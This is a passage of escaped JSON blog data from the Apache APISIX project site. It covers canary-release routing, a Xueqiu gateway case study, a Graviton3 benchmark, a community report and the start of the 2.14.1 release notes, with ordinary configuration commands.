C[172.18.144.90]%\\r\\n```\\r\\n\\r\\nVisit `www.gray.com` route to the `gray` version of A application:\\r\\n\\r\\n```Nginx\\r\\ncurl -H\\"Host:www.gray.com\\" http://47.97.253.177/a\\r\\nAgray[172.18.144.16] -> Bgray[172.18.144.57] -> Cgray[172.18.144.157]%\\r\\n```\\r\\n\\r\\n### Scenario 2: Routing by specified request parameters\\r\\n\\r\\nSome clients can\'t rewrite the domain name. Users hope to visit `www.demo.com` routes to the gray environment by passing in different parameters. For example, in the following figure, the gray environment is accessed through the request parameter `env=gray`.\\r\\n\\r\\n![Scenario 2](https://static.apiseven.com/2022/06/blog/2/173321500-ee604a73-f41b-4fc1-8861-c591bbb9d257.png)\\r\\n\\r\\nCall the link ingress apisik - > A - > b - > C, where a can be a spring boot application.\\r\\n\\r\\n#### Configure APISIX routing rules\\r\\n\\r\\nSelect a route in the apisixdashboard and click create. In the matching criteria, create a new advanced matching rule, request path selection / *, and select the corresponding upstream. Configure the following routes respectively:\\r\\n\\r\\n- When the host is `www.demo.com`, when the request parameter `env=gray`, the route priority matches the upstream corresponding to the ID `401163331936715388`, that is, `spring-cloud-a-gray-svc`;\\r\\n\\r\\n- When the host is `www.demo.com`, the route will match the upstream corresponding to ID `4011524535454748`, that is, `spring-cloud-a-svc`.\\r\\n\\r\\nThen configure the route corresponding to the `base`:\\r\\n\\r\\n```json\\r\\n{\\r\\n  \\"uri\\": \\"/*\\",\\r\\n  \\"name\\": \\"spring-cloud-a\\",\\r\\n  \\"methods\\": [\\r\\n    \\"GET\\",\\r\\n    \\"POST\\",\\r\\n    \\"PUT\\",\\r\\n    \\"DELETE\\",\\r\\n    \\"PATCH\\",\\r\\n    \\"HEAD\\",\\r\\n    \\"OPTIONS\\",\\r\\n    \\"CONNECT\\",\\r\\n    \\"TRACE\\"\\r\\n  ],\\r\\n  \\"host\\": \\"www.demo.com\\",\\r\\n  \\"upstream_id\\": \\"401152455435354748\\",\\r\\n  \\"labels\\": {\\r\\n    \\"API_VERSION\\": \\"0.0.1\\"\\r\\n  },\\r\\n  \\"status\\": 1\\r\\n}\\r\\n```\\r\\n\\r\\nConfigure the route corresponding to `gray`, as shown in the following figure:\\r\\n\\r\\n![Configure diagram](https://static.apiseven.com/2022/blog/0614/mse-en3.png)\\r\\n\\r\\n```json\\r\\n{\\r\\n  \\"uri\\": \\"/*\\",\\r\\n  \\"name\\": \\"spring-cloud-a-gray\\",\\r\\n  \\"priority\\": 1,\\r\\n  \\"methods\\": [\\r\\n    \\"GET\\",\\r\\n    \\"POST\\",\\r\\n    \\"PUT\\",\\r\\n    \\"DELETE\\",\\r\\n    \\"PATCH\\",\\r\\n    \\"HEAD\\",\\r\\n    \\"OPTIONS\\",\\r\\n    \\"CONNECT\\",\\r\\n    \\"TRACE\\"\\r\\n  ],\\r\\n  \\"host\\": \\"www.demo.com\\",\\r\\n  \\"vars\\": [\\r\\n    [\\r\\n      \\"arg_env\\",\\r\\n      \\"==\\",\\r\\n      \\"gray\\"\\r\\n    ]\\r\\n  ],\\r\\n  \\"upstream_id\\": \\"401163331936715388\\",\\r\\n  \\"labels\\": {\\r\\n  \\"API_VERSION\\": \\"0.0.1\\"\\r\\n  },\\r\\n  \\"status\\": 1\\r\\n}\\r\\n```\\r\\n\\r\\n#### Configure canary release along the whole life cycle of MSE\\r\\n\\r\\nThe configuration steps are consistent with those in scenario 1.\\r\\n\\r\\n#### Validation of results\\r\\n\\r\\nAt this point, visit `www.demo.com` route to baseline environment:\\r\\n\\r\\n```Nginx\\r\\ncurl -H\\"Host:www.demo.com\\" http://47.97.253.177/a\\r\\nA[172.18.144.15] -> B[172.18.144.125] -> C[172.18.144.90]%\\r\\n```\\r\\n\\r\\nAt this point, visit `www.demo.com` while `env=gray` routing to gray environment:\\r\\n\\r\\n```Nginx\\r\\ncurl -H\\"Host:www.demo.com\\" http://47.97.253.177/a?env=gray\\r\\nAgray[172.18.144.16] -> Bgray[172.18.144.57] -> Cgray[172.18.144.157]%\\r\\n```\\r\\n\\r\\n> Note: among them, `47.97.253.177` is the public IP of APISIX.\\r\\n\\r\\n## Summary\\r\\n\\r\\nBased on the flexible routing capability of Apache APISIX and the canary release along the whole life cycle capability of MSE, the enterprise level canary release along the whole life cycle capability can be quickly realized.\\r\\n\\r\\nAPISIX supports routing by header, cookie, params, domain name and other methods. It only needs to route the traffic to different \\"swimlane\\" environments on the gateway side according to the needs, and the traffic will be closed automatically in the \\"swimlane\\" of the corresponding tag. When there are no other services in the swimlane that the call chain depends on, the traffic needs to be returned to the baseline environment, and further routed back to the swimlane of the corresponding tag when necessary"},{"id":"Architecture evolution of investment platforms with API gateway","metadata":{"permalink":"/blog/2022/06/14/xueqiu-with-apache-apisix","source":"@site/blog/2022/06/14/xueqiu-with-apache-apisix.md","title":"Architecture evolution of investment platforms with API gateway","description":"This article introduces how Xueqiu uses APISIX to achieve more flexible services in adjusting the active-active architecture.","date":"2022-06-14T00:00:00.000Z","formattedDate":"June 14, 2022","tags":[{"label":"Case Studies","permalink":"/blog/tags/case-studies"}],"readingTime":9.36,"truncated":true,"authors":[{"name":"Xueqiu Basic Component Team","title":"Author"},{"name":"Sylvia","title":"Technical Writer","url":"https://github.com/SylviaBABY","image_url":"https://avatars.githubusercontent.com/u/39793568?v=4","imageURL":"https://avatars.githubusercontent.com/u/39793568?v=4"}],"prevItem":{"title":"Implementation of canary release solution based on Apache APISIX","permalink":"/blog/2022/06/14/how-mse-supports-canary-release-with-apache-apisix"},"nextItem":{"title":"Installation and performance testing of API Gateway Apache APISIX on AWS Graviton3","permalink":"/blog/2022/06/07/installation-performance-test-of-apigateway-apisix-on-aws-graviton3"}},"content":"> This article is compiled from the sharing at [Apache APISIX Summit ASIA 2022](https://apisix-summit.org/). It introduces how Xueqiu uses APISIX to achieve more flexible services in adjusting the active-active architecture.\\n\\n\x3c!--truncate--\x3e\\n\\n## Background\\n\\nFounded in 2010, Xueqiu started as an investment community and has become a leading online management platform integrating investment, communication and trading in China, providing investors with quality content, real-time quotes, trading tools, wealth management and other services.\\n\\nAmong them, the real-time quotes service is docked to a variety of upstream data sources, through data streaming calculation, storage and distribution, providing investors with stable data services. Therefore, real-time quotes have been a major resource consumer in Xueqiu\'s business system, which continues to run at a high water level. An important task within Xueqiu is the ongoing stability building, which includes performance optimization of the quotes service. Even so, in the occasional case of extreme quotes, some systems still experience a slow response or even unavailability due to a surge in data volume, thus affecting the user experience.\\n\\nApache APISIX can greatly simplify the complexity of implementing a dual-active architecture. APISIX\'s own cloud-native features, rich community ecology and plug-ins also lay a good foundation for the future evolution of Xueqiu\'s cloud-native architecture. In this article, we will introduce how Xueqiu is using Apache APISIX to evolve its internal dual-active architecture.\\n\\n![Original architecture](https://static.apiseven.com/2022/blog/0614/xueqiu-en1.png)\\n\\nThe diagram above depicts the simple architecture of Xueqiu single room period, user traffic comes in from the cloud portal (SLB), and is processed by the gateway for simple public nature logic and forwarded to the back-end service. The back-end service will be through the SDK, the authentication module integrated in the service to the Xueqiu user center to initiate user authentication, and then continue to follow the business processing.\\n\\n### Dual-active transformation pain points\\n\\nIn the practical business scenario, some pain points of the architecture also began to emerge.\\n\\n1. Complex SDK authentication module\\n\\nDuring the implementation of the dual-active transformation, the provider and consumer of microservices cannot fully synchronize the deployment and go live. When the quotation service is first online in the cloud, and the Xueqiu user center does not yet have cloud service capabilities, there will be a cross-room invocation situation. According to the user center statistics, its RPC call volume is about billions per day, the peak can reach 50K QPS, in the high QPS scenario of the market will bring high latency.\\n\\nAt the same time, Xueqiu\'s forensic services are highly complex, and need to take into account various factors such as client version and multiple APPs under Xueqiu, in addition to OAuth2.0/JWT protocol. Because the authentication module is embedded in the service, it becomes more difficult to upgrade.\\n\\n2. OpenResty less functional\\n\\nXueqiu has been using OpenResty as a gateway before, and its own functionality is slightly inadequate. Therefore, when integrating OpenResty into Xueqiu\'s existing monitoring system, it still requires a certain amount of work; at the same time, the extension process is cumbersome and requires the operation and maintenance side to add custom scripts to achieve.\\n\\n3. Rely on self-research registration center\\n\\nThe current HTTP service registration of Xueqiu is to request the registry to register itself to the gateway when the back-end service is started, and request the registry to remove the service node when the service is stopped, and the registry will periodically poll the service node for health checks. However, the self-developed service is more expensive to maintain compared to open source projects.\\n\\n### API gateway selection\\n\\nSo on top of these pain points, Xueqiu wanted to be as transparent as possible to the business side and minimize changes without introducing too many variables; the problem could be handled uniformly at the infrastructure level and the forensic services could be done in the local server room as much as possible. With the above in mind, Xueqiu decided to move the forensic services to the API gateway for completion.\\n\\nBased on the pain points that became apparent in the business practice scenarios, the Xueqiu Infrastructure team began researching gateway products. Through internal requirements and the comparison of current market gateway products, the final choice of the subsequent architecture based on Apache APISIX adjustment and use.\\n\\n![Ecological](https://static.apiseven.com/2022/blog/0614/xueqiu-en2.png)\\n\\n## Apache APISIX Practice\\n\\n### Adjusted architecture\\n\\n![New architecture](https://static.apiseven.com/2022/blog/0614/xueqiu-en3.png)\\n\\nThe above figure shows the current dual-active architecture of Xueqiu Quotes. The left side shows the corresponding architecture in the original server room without much change; the right side shows the multi-live architecture designed based on multiple regions after going to the cloud.\\n\\nThe above architecture is mainly based on APISIX with the following adjustments.\\n\\n- The authentication module is adjusted to the proxy layer, and APISIX is used to unify the authentication method. The JWT type can directly use the APISIX `jwt-auth` plugin for local authentication.\\n- Compatible with OAuth 2.0 form, the use of APISIX unified call Xueqiu user center for processing.\\n- Docking Xueqiu back-end RPC service registry, for JWT authentication failure to use Xueqiu back-end services to authenticate.\\n\\n### Application scenario demonstration\\n\\nAfter the back-end services are connected to APISIX, some practices are carried out mainly at the level of gateway authentication and observability.\\n\\n#### Gateway authentication\\n\\nAs mentioned in the previous article, the authentication methods in Xueqiu\'s previous architecture model were not uniform. One needs to rely on the internal application side, through the form of SDK to call the user center to achieve authentication, and the other uses JWT authentication. When the two authentication methods coexist, it brings the problem of poor scalability and maintenance.\\n\\nAfter APISIX has been implemented as a gateway, the authentication solution is managed through the APISIX gateway layer. Based on the official plugin `jwt-auth` to replace the original JWT authentication method; at the same time, combined with the internal business requirements of Xueqiu, using APISIX grpc-transcode plugin proxy call authentication services, to handle the previous OAuth 2.0 related authentication methods.\\n\\nThe `jwt-auth` plugin is simple to configure and use, and can be turned on in the Dashboard with complete configuration of routing and upstream/downstream information. Here is a description of how Xueqiu internally uses APISIX to call gRPC to achieve authentication.\\n\\nBefore implementing the call, Xueqiu has considered the following three solutions.\\n\\n- Option 1: Lua call gRPC directly, because this solution in the implementation, need to consider load balancing and dynamic upstream and other related implementation, the process will be more trouble, so abandoned.\\n- Option 2: Lua concurrent callback to Golang, which is discarded due to lack of practical experience within the company.\\n- Option 3: Lua makes HTTP calls and the gRPC interface is implemented using the APISIX `grpc-transcode` plugin. Thanks to the APISIX community\'s premise of fast iteration of plugin optimization, we finally chose option 3 to implement gRPC calls.\\n\\nDuring the implementation, manual synchronization of the protocol buffers file is still required. This is because if the protocol buffers file is modified by the user center but does not match the protocol buffers file saved by APISIX, it will cause authentication problems.\\n\\n#### Observability under the multi-dimensional monitoring\\n\\nXueqiu\'s daily use scenario, usually after the site is online is required to monitor many indicators, focusing on the following three main parts.\\n\\n- NGINX connection status and import/export traffic\\n- HTTP error status code rate (for troubleshooting service or upstream and downstream problems)\\n- APISIX request latency time consumption (APISIX to forward the logic implementation of the time consuming)\\n\\nFor example, the APISIX latency metric can be very high in some cases (as shown in the figure below), which is actually related to the calculation logic of the latency metric. The current calculation logic of the APISIX latency metric is: the time taken for a single HTTP request on NGINX - the delay in routing the request upstream. The difference between the two elapsed times is the APISIX latency metric data.\\n\\n![Delay indicator](https://static.apiseven.com/2022/06/blog/xueqiu-5.png)\\n\\nAfter using APISIX, adding or modifying some plugins will lead to some logic changes, which may lead to deviations in the time-consuming related data. In order to avoid confusing the authenticity of the data, Xueqiu has also increased the monitoring level based on the plugin level of time consumption monitoring. In order to ensure the accuracy of each data monitoring, it also facilitates the subsequent plug-in level business transformation, locating some problems through time consumption in advance, thus facilitating troubleshooting.\\n\\n![Data manifestation](https://static.apiseven.com/2022/06/blog/xueqiu-6.png)\\n\\nYou can also take advantage of APISIX\'s observability capabilities to collect Access log information and format it for unified delivery to the traffic dashboard for view aggregation. It is easier to understand the overall trend in advance from multiple perspectives, identify potential problems and deal with them in time.\\n\\n![Summary](https://static.apiseven.com/2022/06/blog/xueqiu-7.png)\\n\\n#### Extending the ZooKeeper registry\\n\\nCurrently, Xueqiu gRPC service calls are based on the Zookeeper registry for registration and discovery. In the process of authentication, the API gateway needs to access the Xueqiu user center gRPC service for authentication when the local JWT verification fails, which requires the API gateway to obtain the back-end gRPC service address list from the registry. apisix-seed, the official plugin of APISIX, can integrate with ZooKeeper for service discovery, but combined with Xueqiu\'s own use The official APISIX plugin apisix-seed can be integrated with ZooKeeper for service discovery, but combined with Xueqiu\'s own use scenario requirements, in APISIX is more for their own business related expansion.\\n\\nThe specific implementation is mainly on a content node of APISIX, when the worker process starts to poll the ZK-Rest cluster like in the figure below, and then regularly pull the source data information and actual information of the whole service, update to the local cache in the worker process, and use it to update the service list.\\n\\n![Extend ZooKeeper](https://static.apiseven.com/2022/blog/0614/xueqiu-en4.png)\\n\\nAs you can see from the above diagram, the ZK-Rest cluster is equivalent to accessing the data of ZooKeeper through the form of Rest. Therefore, the whole process is actually less functional (mainly based on its own business scenario requirements), and only one instance of it needs to be added to achieve the high availability feature, eliminating some complex operations.\\n\\nHowever, this operation also brings a rather obvious disadvantage. When the ZK-Rest cluster needs to be polled regularly, it may cause a delay in updating the service list. So here is an idea for your reference only.\\n\\n## Summary and Outlook\\n\\nCurrently, Apache APISIX is working well as a gateway layer within Xueqiu. Specifically, it shows that:\\n\\n- Achieving unified authentication, fusing and flow limiting at the gateway layer.\\n- Reducing the overall system coupling and improving the quality of service in a dual-room scenario.\\n- With the APISIX monitoring system, the unified monitoring scheme from gateway to service is improved.\\n- Providing good support for full-link exclusion.\\n- Provides a more elegant implementation of both gRPC protocol conversion and service management.\\n\\nIn subsequent use, Xueqiu is also planning the following processes:\\n\\n- Use of APISIX Ingress Controller applied to K8s clusters.\\n- Using the `grpc-transcode` plugin for HTTP/gRPC protocol conversion to achieve a unified back-end interface form.\\n- Using `traffic-spilt` plugin for traffic marking, docking to Nacos registry, achieving full-link grayscale and other service governance.\\n\\nAnd in the follow-up plan, we use Apache APISIX to replace the existing OpenResty, and finally realize the management of north-south traffic in the whole domain."},{"id":"Installation and performance testing of API Gateway Apache APISIX on AWS Graviton3","metadata":{"permalink":"/blog/2022/06/07/installation-performance-test-of-apigateway-apisix-on-aws-graviton3","source":"@site/blog/2022/06/07/installation-performance-test-of-apigateway-apisix-on-aws-graviton3.md","title":"Installation and performance testing of API Gateway Apache APISIX on AWS Graviton3","description":"This article uses APISIX to compare the performance of AWS Graviton3 and AWS Graviton2. AWS Graviton3 shows the power performance in the API gateway.","date":"2022-06-07T00:00:00.000Z","formattedDate":"June 7, 2022","tags":[{"label":"Ecosystem","permalink":"/blog/tags/ecosystem"}],"readingTime":3.995,"truncated":true,"authors":[{"name":"Shirui Zhao","title":"Author","url":"https://github.com/soulbird","image_url":"https://avatars.githubusercontent.com/u/11553520?v=4","imageURL":"https://avatars.githubusercontent.com/u/11553520?v=4"},{"name":"Sylvia","title":"Technical Writer","url":"https://github.com/SylviaBABY","image_url":"https://avatars.githubusercontent.com/u/39793568?v=4","imageURL":"https://avatars.githubusercontent.com/u/39793568?v=4"}],"prevItem":{"title":"Architecture evolution of investment platforms with API gateway","permalink":"/blog/2022/06/14/xueqiu-with-apache-apisix"},"nextItem":{"title":"Biweekly Report (May 16th - May 31th)","permalink":"/blog/2022/06/07/weekly-report-0607"}},"content":"> Apache APISIX has carried out regression tests under the ARM64 platform, and fixed some compatibility issues of the build scripts under the ARM64 platform. Through a brief deployment test description, this article shows that in the AWS Graviton environment, both in terms of stability and traffic processing, APISIX\'s performance is very dazzling.\\n\\n\x3c!--truncate--\x3e\\n\\n## Background\\n\\nAWS released the latest ARM-based AWS Graviton family of processors at the end of May 2022 - [AWS Graviton3](https://aws.amazon.com/cn/blogs/aws/new-amazon-ec2-c7g-instances-powered-by-aws-graviton3-processors/). According to AWS official data, compared with Graviton2 processor, based on leading DDR5 memory technology, Graviton3 processor can provide up to 25% performance improvement, up to 2x floating point performance and 50% faster memory access speed; Graviton3 also uses 60% less energy on the same EC2 instance of the same type.\\n\\nSo what about the actual data? Let\'s take a network IO dense API Gateway as an example to see how AWS Graviton3 performs. Here we use Apache APISIX to perform performance comparison tests on AWS Graviton2 (C6g) and AWS Graviton3 (C7g) server environments.\\n\\n[Apache APISIX](https://github.com/apache/apisix) is a cloud-native, high-performance, scalable API gateway. Based on NGNIX+LuaJIT and etcd, compared with traditional API gateways, APISIX has dynamic routing and plug-in hot loading features, which is especially suitable for API management under cloud native architecture.\\n\\n![Apache APISIX](https://user-images.githubusercontent.com/39793568/172329936-774992c0-070b-48d0-be8b-33abbd6a4f78.png)\\n\\n## Installation and Deployment\\n\\nPrepare a server with an ARM64 chip, here we choose Amazon EC2 C7g(Only this model now has AWS Graviton3), and the operating system chooses Ubuntu 20.04.\\n\\n![Amazon EC2](https://user-images.githubusercontent.com/39793568/172340229-caf59d9c-cba2-4c95-a892-ef7cf29a0436.png)\\n\\nDon\'t forget to install Docker:\\n\\n```shell\\nsudo apt-get update && sudo apt-get install docker.io\\n```\\n\\nApache APISIX has released the latest version of the ARM64 image, which can be deployed with one click using Docker. The detailed process can be found below.\\n\\n1. Start etcd\\n\\n```shell\\nsudo docker run -d \\\\\\n--name etcd -p 2379:2379 -e ETCD_UNSUPPORTED_ARCH=arm64 \\\\\\n-e ETCD_LISTEN_CLIENT_URLS=http://0.0.0.0:2379 \\\\\\n-e ETCD_ADVERTISE_CLIENT_URLS=http://0.0.0.0:2379 \\\\\\nrancher/coreos-etcd:v3.4.16-arm64\\n```\\n\\n2. Start APISIX\\n\\n```\\nsudo docker run --net=host -d apache/apisix:2.14.1-alpine\\n```\\n\\n3. Register Route\\n\\n```\\ncurl \\"http://127.0.0.1:9080/apisix/admin/routes/1\\" \\\\\\n-H \\"X-API-KEY: edd1c9f034335f136f87ad84b625c8f1\\" -X PUT -d \'\\n{\\n  \\"uri\\": \\"/anything/*\\",\\n  \\"upstream\\": {\\n    \\"type\\": \\"roundrobin\\",\\n    \\"nodes\\": {\\n      \\"httpbin.org:80\\": 1\\n    }\\n  }\\n}\'\\n```\\n\\n4. Test\\n\\n```shell\\ncurl -i http://127.0.0.1:9080/anything/das\\n```\\n\\n```shell\\nHTTP/1.1 200 OK\\n.....\\n```\\n\\n## Performance Comparison of AWS Graviton2 and AWS Graviton3\\n\\nAccording to the previous operations, based on the official [script](https://github.com/apache/apisix/blob/master/benchmark/run.sh), the installation and compatibility test of APISIX on the AWS Graviton3 processor was successfully completed. Let\'s take a look at the performance of Apache APISIX on AWS Graviton2 (C6g) and AWS Graviton3 (C7g).\\n\\nFor the sake of simplicity, only one Worker is enabled in APISIX in this test, and the following performance test data are all run on a single-core CPU.\\n\\n### Scenario 1: Single upstream\\n\\nUse a single upstream, without any plugins. It mainly tests the performance of APISIX in pure proxy back-to-origin mode.\\n\\n```shell\\n# apisix: 1 worker + 1 upstream + no plugin\\n\\n# register route\\ncurl http://127.0.0.1:9080/apisix/admin/routes/1 -H \'X-API-KEY: edd1c9f034335f136f87ad84b625c8f1\' -X PUT -d \'\\n{\\n    \\"uri\\": \\"/hello\\",\\n    \\"plugins\\": {\\n    },\\n    \\"upstream\\": {\\n        \\"type\\": \\"roundrobin\\",\\n        \\"nodes\\": {\\n            \\"127.0.0.1:1980\\":1\\n        }\\n    }\\n}\'\\n```\\n\\n### Scenario 2: Single upstream + Two plugins\\n\\nUsing a single upstream, two plugins. It mainly tests the performance of APISIX when the two core performance-consuming plugins, `limit-count` and `prometheus`, are enabled.\\n\\n```shell\\n# apisix: 1 worker + 1 upstream + 2 plugins (limit-count + prometheus)\\n\\n# register route\\ncurl http://127.0.0.1:9080/apisix/admin/routes/1 -H \'X-API-KEY: edd1c9f034335f136f87ad84b625c8f1\' -X PUT -d \'\\n{\\n    \\"uri\\": \\"/hello\\",\\n    \\"plugins\\": {\\n        \\"limit-count\\": {\\n            \\"count\\": 2000000000000,\\n            \\"time_window\\": 60,\\n            \\"rejected_code\\": 503,\\n            \\"key\\": \\"remote_addr\\"\\n        },\\n        \\"prometheus\\": {}\\n    },\\n    \\"upstream\\": {\\n        \\"type\\": \\"roundrobin\\",\\n        \\"nodes\\": {\\n            \\"127.0.0.1:1980\\":1\\n        }\\n    }\\n}\'\\n```\\n\\n### Data Comparison\\n\\nIn the above two scenarios, related testing and comparison were performed from the two levels of request processing and delay time. The results are as follows:\\n\\n1. QPS comparison\\n\\n![QPS](https://user-images.githubusercontent.com/39793568/172341634-464f06bc-67cd-4b5a-8671-7c476eaed7d4.png)\\n\\n2. Latency comparison\\n\\n![Latency](https://user-images.githubusercontent.com/39793568/172341805-aee6e3ef-bfd8-4053-824c-af0ba2809592.png)\\n\\n<table>\\n    <tr>\\n        <td><b>  </b></td>\\n        <td colspan=\\"2\\">Single Upstream</td>\\n        <td colspan=\\"2\\">Single Upstream+Two Plugins</td>\\n    </tr>\\n    <tr>\\n        <td><b>  </b></td>\\n        <td><b>AWS Graviton2</b></td>\\n        <td><b>AWS Graviton3</b></td>\\n        <td><b>AWS Graviton2</b></td>\\n        <td><b>AWS Graviton3</b></td>\\n    </tr>\\n    <tr>\\n        <td><b>QPS(request/s)</b></td>\\n        <td><b>13000</b></td>\\n        <td><b>23000(Increase 76%)</b></td>\\n        <td><b>11000</b></td>\\n        <td><b>18000(Increase 63%)</b></td>\\n    </tr>\\n    <tr>\\n        <td><b>Latency(ms)</b></td>\\n        <td><b>1.11</b></td>\\n        <td><b>0.68(Reduce 38%)</b></td>\\n        <td><b>1.39</b></td>\\n        <td><b>0.88(Reduce 37%)</b></td>\\n    </tr>\\n    </table>\\n\\nIt can also be seen from the above data that in a network IO dense computing scenario such as API Gateway, AWS Graviton3 improves the performance by 76% compared to AWS Graviton2, while reducing latency by 38%. This data is even better than the official data given by AWS mentioned at the beginning (25% performance improvement).\\n\\n## Summarize\\n\\nThis article mainly uses Apache APISIX to compare the performance of AWS Graviton3 and AWS Graviton2. It can be seen that in the network IO dense computing scenario of API gateway, AWS Graviton3 can be said to show the properties of a performance monster. Of course, it is also recommended that you practice a lot, and look forward to more test data for computing-intensive projects in the future."},{"id":"Biweekly Report (May 16th - May 31th)","metadata":{"permalink":"/blog/2022/06/07/weekly-report-0607","source":"@site/blog/2022/06/07/weekly-report-0607.md","title":"Biweekly Report (May 16th - May 31th)","description":"The Apache APISIX Community Weekly Report hopes to help community members better understand the weekly progress of the Apache APISIX community.","date":"2022-06-07T00:00:00.000Z","formattedDate":"June 7, 2022","tags":[{"label":"Community","permalink":"/blog/tags/community"}],"readingTime":1.425,"truncated":true,"authors":[],"prevItem":{"title":"Installation and performance testing of API Gateway Apache APISIX on AWS Graviton3","permalink":"/blog/2022/06/07/installation-performance-test-of-apigateway-apisix-on-aws-graviton3"},"nextItem":{"title":"Release Apache APISIX 2.14.1","permalink":"/blog/2022/05/31/release-apache-apisix-2.14"}},"content":"> From May 16th to May 31th, 33 contributors submitted 96 commits for Apache APISIX. Thank you all for your contributions to Apache APISIX!\\n\\n\x3c!--truncate--\x3e\\n\\n## Introduction\\n\\nApache APISIX has grown as a community from the first day of open source and has quickly become the most active open source API gateway project in the world. These achievements cannot be achieved without the joint efforts of our community partners.\\n\\n\\"If you want to go fast, go alone.If you want to go far, go together.\\" The Apache APISIX Community Weekly Report hopes to help community members better understand the weekly progress of the Apache APISIX community and and facilitate everyone to participate in the Apache APISIX community.\\n\\nWe have also compiled some issues suitable for newcomers to the community to participate in! If you are interested, don\'t miss it!\\n\\n## Contributor Statistics\\n\\n![Contributors List](https://user-images.githubusercontent.com/88811141/174762493-6bdb893a-241d-4ae5-84e0-63e5fb0cadb4.png)\\n\\n![New Contributors](https://user-images.githubusercontent.com/88811141/174762575-4de25c71-befa-422f-abb3-86547ae4480d.png)\\n\\n## Good first issue\\n\\n### Issue #7164\\n\\n**Link**: https://github.com/apache/apisix/issues/7164\\n\\n**Description**: Currently we are using Semantic Pull Requests to check in PR but the project is no longer maintained. we need some alternatives.\\n\\ne.g.\\n\\nhttps://github.com/amannn/action-semantic-pull-request\\n\\n## Highlights of Recent Features\\n\\n- [xRPC adds `rpc_time` variable](https://github.com/apache/apisix/pull/7040)\uff08Contributor: [tzssangglass](https://github.com/tzssangglass)\uff09\\n\\n- [pubsub supports Kafka](https://github.com/apache/apisix/pull/7032)\uff08Contributor: [bzp2010](https://github.com/bzp2010)\uff09\\n\\n- [xrpc add `redis_cmd_line` variable](https://github.com/apache/apisix/pull/6959)\uff08Contributor: [spacewander](https://github.com/spacewander)\uff09\\n\\n- [add default handler for pubsub ping command](https://github.com/apache/apisix/pull/7058)\uff08Contributor: [bzp2010](https://github.com/bzp2010)\uff09\\n\\n- [pubsub supports Kafka TLS and SASL/PLAIN auth](https://github.com/apache/apisix/pull/7046)\uff08Contributor: [bzp2010](https://github.com/bzp2010)\uff09\\n\\n- [allow customizing response in the plugin](https://github.com/apache/apisix/pull/7128)\uff08Contributor: [spacewander](https://github.com/spacewander)\uff09\\n\\n- [support gateway API HTTPRoute in APISIX Ingress](https://github.com/apache/apisix-ingress-controller/pull/1037)\uff08Contributor: [lingsamuel](https://github.com/lingsamuel))\\n\\nThe Apache APISIX project website and the Github issue have accumulated a wealth of documentation and experience, so if you encounter problems, you can read the documentation, search the issue with keywords, or participate in the discussion on the issue to put forward your own ideas and practical experience."},{"id":"Release Apache APISIX 2.14.1","metadata":{"permalink":"/blog/2022/05/31/release-apache-apisix-2.14","source":"@site/blog/2022/05/31/release-apache-apisix-2.14.md","title":"Release Apache APISIX 2.14.1","description":"2.14.1 is officially released! This release supports service discovery on CP and Web Socket-based pubsub proxy and non-HTTP Layer 7 protocols.","date":"2022-05-31T00:00:00.000Z","formattedDate":"May 31, 2022","tags":[{"label":"Community","permalink":"/blog/tags/community"}],"readingTime":6.58,"truncated":true,"authors":[{"name":"Zexuan Luo","title":"Author","url":"https://github.com/spacewander","image_url":"https://avatars.githubusercontent.com/u/4161644?v=4","imageURL":"https://avatars.githubusercontent.com/u/4161644?v=4"},{"name":"Fei Han","title":"Technical Writer","url":"https://github.com/hf400159","image_url":"https://github.com/hf400159.png","imageURL":"https://github.com/hf400159.png"}],"prevItem":{"title":"Biweekly Report (May 16th - May 31th)","permalink":"/blog/2022/06/07/weekly-report-0607"},"nextItem":{"title":"Biweekly Report (May 1 - May 15)","permalink":"/blog/2022/05/19/weekly-report-0519"}},"content":"> Exploratory release - Apache APISIX 2.14.1 is officially released. This release supports not only service discovery on the control plane, but also Istio, a WebSocket-based pubsub proxy framework, and an xRPC-based framework for managing non-HTTP layer 7 protocols.\\n\\n\x3c!--truncate--\x3e\\n\\nIt has been more than two months since the last APISIX v2.13 LTS version was released. In the past, each minor version release of APISIX will bring you new functions. However, the functions released in APISIX v2.14.1 will keep up with the forefront of technology, bringing you many exploratory new functions, and will explore the release of APISIX v3. Welcome to explore these new functions.\\n\\nNext, let\'s take a look at what exploratory new features are supported by APISIX.\\n\\n![Apache APISIX 2.14.0 Features Preview](https://static.apiseven.com/202108/1653985197318-dfabcc34-29c5-4f51-a471-c37af73a3f29.png)\\n\\n## Pubsub proxy framework based on WebSocket\\n\\nBefore APISIX v2.14.1, whether it was proxying gRPC requests or ordinary HTTP requests, the upstream of APISIX was a docking application server, which could not meet the needs of diversified scenarios. For example, if users need to use other upstream types (such as Kafka), they can only achieve it through other means. However, in APISIX v2.14.1, APISIX has added a Websocket-based message subscription broker framework, which allows clients to subscribe to messages in a specified message queue (upstream) through APISIX. Now you can use APISIX to subscribe to Kafka messages.\\n\\nTaking Kafka as an example, we need to configure the following:\\n\\n```shell\\ncurl -X PUT \'http://127.0.0.1:9080/apisix/admin/routes/kafka\' \\\\\\n    -H \'X-API-KEY: ${api-key}\' \\\\\\n    -H \'Content-Type: application/json\' \\\\\\n    -d \'{\\n    \\"uri\\": \\"/kafka\\",\\n    \\"upstream\\": {\\n        \\"nodes\\": {\\n            \\"kafka-server1:9092\\": 1,\\n            \\"kafka-server2:9092\\": 1,\\n            \\"kafka-server3:9092\\": 1\\n        },\\n        \\"type\\": \\"none\\",\\n        \\"scheme\\": \\"kafka\\"\\n    }\\n}\'\\n```\\n\\nThe above example is to add a Kafka-type upstream to the route and include multiple Brokers.\\nYou can subscribe to this upstream by referring to the following steps:\\n\\n1. First, establish a connection via WebSocket.\\n2. Get the current offset of a Partition in Topic. The following example uses Protobuf to encode the associated request and response:\\n\\n```\\nmessage PubSubReq {\\n    int64 sequence = 1;\\n    oneof req {\\n        CmdEmpty cmd_empty                       = 31;\\n        CmdPing cmd_ping                         = 32;\\n        CmdKafkaFetch      cmd_kafka_fetch       = 33;\\n        CmdKafkaListOffset cmd_kafka_list_offset = 34;\\n    };\\n}\\n\\nmessage PubSubResp {\\n    int64 sequence = 1;\\n    oneof resp {\\n        ErrorResp error_resp                       = 31;\\n        PongResp pong_resp                         = 32;\\n        KafkaFetchResp kafka_fetch_resp            = 33;\\n        KafkaListOffsetResp kafka_list_offset_resp = 34;\\n    };\\n}\\n```\\n\\nFor example, the request to get the offset is:\\n\\n```shell\\nmessage CmdKafkaListOffset {\\n    string topic = 1;\\n    int32 partition = 2;\\n    int64 timestamp = 3;\\n}\\n```\\n\\nFor the specific meaning of each field, please refer to [pubsub.proto](https://github.com/apache/apisix/blob/master/apisix/include/apisix/model/pubsub.proto).\\n\\n3. 